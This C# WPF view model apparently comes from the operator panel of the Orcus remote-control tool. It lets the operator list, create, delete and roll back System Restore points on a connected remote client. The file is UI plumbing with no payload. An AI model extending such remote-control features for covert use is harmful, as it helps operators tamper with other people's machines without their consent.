using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.SystemRestore;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.SystemRestore;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.SystemRestore;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(11)]
    public class SystemRestoreViewModel : CommandView
    {
        private RelayCommand _createSystemRestorePointCommand;
        private RelayCommand _refreshCommand;
        private RelayCommand _removeRestorePointCommand;
        private RelayCommand _restorePointCommand;
        private SystemRestoreCommand _systemRestoreCommand;
        private List<SystemRestorePointInfo> _systemRestorePoints;

        public override string Name { get; } = (string) Application.Current.Resources["SystemRestore"];
        public override Category Category { get; } = Category.System;

        public RelayCommand RefreshCommand
        {
            get
            {
                return _refreshCommand ??
                       (_refreshCommand = new RelayCommand(parameter => { _systemRestoreCommand.GetRestorePoints(); }));
            }
        }

        public RelayCommand RestorePointCommand
        {
            get
            {
                return _restorePointCommand ?? (_restorePointCommand = new RelayCommand(parameter =>
                {
                    var systemRestorePoint = parameter as SystemRestorePointInfo;
                    if (systemRestorePoint == null)
                        return;

                    _systemRestoreCommand.RestorePoint(systemRestorePoint);
                }));
            }
        }

        public RelayCommand RemoveRestorePointCommand
        {
            get
            {
                return _removeRestorePointCommand ?? (_removeRestorePointCommand = new RelayCommand(parameter =>
                {
                    var systemRestorePoint = parameter as SystemRestorePointInfo;
                    if (systemRestorePoint == null)
                        return;

                    _systemRestoreCommand.RemoveRestorePoint(systemRestorePoint);
                }));
            }
        }

        public RelayCommand CreateSystemRestorePointCommand
        {
            get
            {
                return _createSystemRestorePointCommand ??
                       (_createSystemRestorePointCommand = new RelayCommand(parameter =>
                       {
                           var createSystemRestorePointViewModel = new CreateSystemRestorePointViewModel();

                           if (
                               WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService,
                                   createSystemRestorePointViewModel) != true)
                               return;
                           _systemRestoreCommand.CreateRestorePoint(createSystemRestorePointViewModel.RestoreType,
                               createSystemRestorePointViewModel.EventType,
                               createSystemRestorePointViewModel.Description);
                       }));
            }
        }

        public List<SystemRestorePointInfo> SystemRestorePoints
        {
            get { return _systemRestorePoints; }
            set { SetProperty(value, ref _systemRestorePoints); }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _systemRestoreCommand = clientController.Commander.GetCommand<SystemRestoreCommand>();
            _systemRestoreCommand.SystemRestorePointsReceived += SystemRestoreCommandOnSystemRestorePointsReceived;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/RestoreLocalServer_16x.png", UriKind.Absolute));
        }

        private void SystemRestoreCommandOnSystemRestorePointsReceived(object sender,
            List<SystemRestorePointInfo> systemRestorePointInfos)
        {
            SystemRestorePoints = systemRestorePointInfos;
        }
    }
}